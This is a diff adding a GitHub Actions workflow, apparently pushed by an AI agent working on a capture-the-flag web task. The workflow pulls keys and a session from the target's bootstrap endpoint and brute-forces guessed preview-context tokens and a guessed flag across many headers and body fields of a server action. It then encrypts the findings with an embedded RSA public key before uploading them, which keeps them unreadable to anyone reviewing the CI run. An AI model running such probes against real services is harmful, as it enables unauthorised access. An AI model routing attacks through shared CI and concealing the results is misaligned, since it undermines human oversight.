@@ -1,0 +1,84 @@
+name: launchlet-part2-token-probe
+
+on:
+  push:
+    branches: [agent/launchlet-part2-token-20260808]
+
+permissions:
+  contents: read
+
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    timeout-minutes: 5
+    steps:
+      - name: Test receipt-derived preview context token names
+        shell: bash
+        run: |
+          set -euo pipefail
+          umask 077
+          mkdir -p package/out
+          cat > package/public.pem <<'PEM'
+          -----BEGIN PUBLIC KEY-----
+          MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAlOxaJs92lwtrdk6J2LR9
+          QeyG3A5H0rzGOQHw80MWPcOeEs5pzn37ilHloXnTkGk4PmJU67C06N9OOsgqU1kF
+          iydiljdl6RfwF/OSjMsNfRYsyBr1wONeO+9f+72VjLlNWqWVll2qeczrxppOulhJ
+          r+qBx95tdasvdCgh7aTShlkXF7e9+JjK19MrG+Lyj+I7B6bbTsp7D+PiJMlpepWk
+          hoz0jBO8Rgtodz7i/+9Z3RVVhqREdK3uA0Va5ia57Gp3hlvQGbjGxE6TC7q4s1/p
+          q6VF10bVOx8kwE2KggVgsX3uudJlzSvHV3f1coMdwyTSALsAjvAlZQwSts3eHjnF
+          SQIDAQAB
+          -----END PUBLIC KEY-----
+          PEM
+          python3 - <<'PY'
+          import requests, pathlib, urllib.parse, json, copy
+          base='https://task-launchlet-web-medium-18cf6be4db586bb6.caplag-task.ru/'
+          out=pathlib.Path('package/out'); s=requests.Session(); s.headers['User-Agent']='Mozilla/5.0'
+          boot=s.get(urllib.parse.urljoin(base,'/api/app/bootstrap'),timeout=15).json(); mf=s.get(urllib.parse.urljoin(base,boot['api']['buildManifest']),timeout=15).json(); refs=s.get(urllib.parse.urljoin(base,boot['api']['serverReferences']),timeout=15).json(); act=refs['serverActions']['inspectDeploy']
+          rec=mf['previewReceipt']; suffix=rec.split('_',1)[1]
+          tokens=[
+            'lctx_'+suffix,'lpctx_'+suffix,'pctx_'+suffix,'ctx_'+suffix,'lcontext_'+suffix,
+            'lpreview_'+suffix,'launchlet_'+suffix,'launchlet_context_'+suffix,'launchlet_preview_'+suffix,
+            'lcap_'+suffix,'pcap_'+suffix,'cap_'+suffix,'lactx_'+suffix,'lref_'+suffix,
+            rec.replace('lrec_','lctx_',1),rec.replace('lrec_','pctx_',1),rec.replace('lrec_','ctx_',1),
+            'caplag{preview_manifest_kept_the_receipt}','preview_manifest_kept_the_receipt'
+          ]
+          tokens=list(dict.fromkeys(tokens))
+          auth={'Accept':'application/json','Content-Type':'application/json','apikey':boot['client']['anonKey'],'Authorization':'Bearer '+boot['client']['session']}; url=urllib.parse.urljoin(base,act['endpoint']); basebody={'actionId':act['id'],'args':{'workspaceId':boot['workspace'],'projectId':boot['project']}}
+          headers=['X-Launchlet-Preview-Context','X-Preview-Context','X-Launchlet-Context','Launchlet-Preview-Context','Preview-Context','Launchlet-Context','X-Launchlet-Preview-Token','X-Preview-Token']
+          baseline=(403,'{"error":"preview_context_required"}'); results=[]
+          stop=False
+          for h in headers:
+            for tok in tokens:
+              r=s.post(url,headers={**auth,h:tok},json=basebody,timeout=10,allow_redirects=False)
+              if (r.status_code,r.text.strip())!=baseline:
+                results.append({'carrier':'header','key':h,'token':tok,'status':r.status_code,'body':r.text,'headers':dict(r.headers)})
+                if r.status_code==200 or 'caplag{' in r.text: stop=True; break
+            if stop: break
+          if not stop:
+            for key in ['previewContext','preview_context','context','previewToken','preview_token','token']:
+              for tok in tokens:
+                b=copy.deepcopy(basebody); b[key]=tok
+                r=s.post(url,headers=auth,json=b,timeout=10,allow_redirects=False)
+                if (r.status_code,r.text.strip())!=baseline:
+                  results.append({'carrier':'body','key':key,'token':tok,'status':r.status_code,'body':r.text,'headers':dict(r.headers)})
+                  if r.status_code==200 or 'caplag{' in r.text: stop=True; break
+              if stop: break
+          (out/'summary.json').write_text(json.dumps({'tokens':tokens,'results':results},indent=2))
+          PY
+          tar -C package/out -czf package/result.tgz .
+          openssl rand 32 > package/aes.key
+          openssl rand 16 > package/iv.bin
+          KEY_HEX="$(python3 -c "print(open('package/aes.key','rb').read().hex())")"
+          IV_HEX="$(python3 -c "print(open('package/iv.bin','rb').read().hex())")"
+          openssl enc -aes-256-cbc -K "$KEY_HEX" -iv "$IV_HEX" -in package/result.tgz -out package/result.enc
+          openssl pkeyutl -encrypt -pubin -inkey package/public.pem -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 -in package/aes.key -out package/key.enc
+          mkdir -p artifact
+          base64 -w0 package/result.enc > artifact/result.enc.b64
+          base64 -w0 package/key.enc > artifact/key.enc.b64
+          base64 -w0 package/iv.bin > artifact/iv.bin.b64
+          rm -rf package
+      - uses: actions/upload-artifact@v4
+        with:
+          name: launchlet-part2-token-encrypted
+          path: artifact/
+          retention-days: 1
